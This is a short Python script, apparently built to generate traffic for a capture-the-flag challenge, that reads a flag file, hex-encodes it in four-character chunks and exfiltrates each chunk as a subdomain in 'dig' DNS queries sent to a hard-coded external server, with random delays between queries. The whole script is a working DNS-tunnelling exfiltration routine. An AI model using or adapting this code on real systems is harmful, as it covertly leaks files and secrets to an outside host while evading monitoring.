import random
import subprocess
import time

with open('../flag.txt') as f:
    DATA = 'Super secret data is ' + f.read()

for i in range(0, len(DATA), 4):
    part = DATA[i:i + 4].encode().hex()
    command = [
        'dig',
        f'{part}.google.com',
        '@104.196.158.159',
        # '@127.0.0.1',
        '+short',
    ]

    print(f'Sending {part}')
    p = subprocess.Popen(command)
    p.wait()
    print(f'Done {min(i + 4, len(DATA))} of {len(DATA)}')
    time.sleep(random.randint(1, 5))
